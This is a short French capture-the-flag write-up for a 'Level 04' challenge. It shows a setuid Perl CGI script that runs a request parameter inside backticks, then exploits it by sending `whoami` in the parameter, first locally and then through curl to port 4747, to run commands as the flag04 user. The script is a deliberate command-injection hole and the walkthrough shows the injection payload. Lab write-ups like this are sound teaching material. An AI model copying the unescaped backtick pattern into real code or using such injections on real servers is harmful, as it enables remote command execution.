# Level 04

The home of level04 user
```
$ ls -la
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
```
On peut voir un script en perl `level04.pl`.
```pl
$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Sur ce script il y a 3 choses à retenir,
 - Un commentaire parlant d'une ip local avec un port
 - Les deux backtick
 - Ce script lit le parametre nommée `x`

Pour confirmer le premier point on peut faire `netstat -nl`, ce qui nous affiche bien le port 4747 sur `listen`
```
$ netstat -nl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
...
tcp6       0      0 :::4747                 :::*                    LISTEN
...
```
Le deuxieme point, on peut executer des commandes via le point numero 3 qui est le parametre x.
```
$ ./level04.pl x='`whoami`'
Content-type: text/html

level04
```
Et maintenant si on fait appel à ce cgi sur le port 4747
```
$ curl 'localhost:4747/level04.pl?x=`whoami`'
flag04
```
Et boom, on voit que le serveur est lancé sur l'user flag04 et qu'on peut exécuter la commande `getflag`
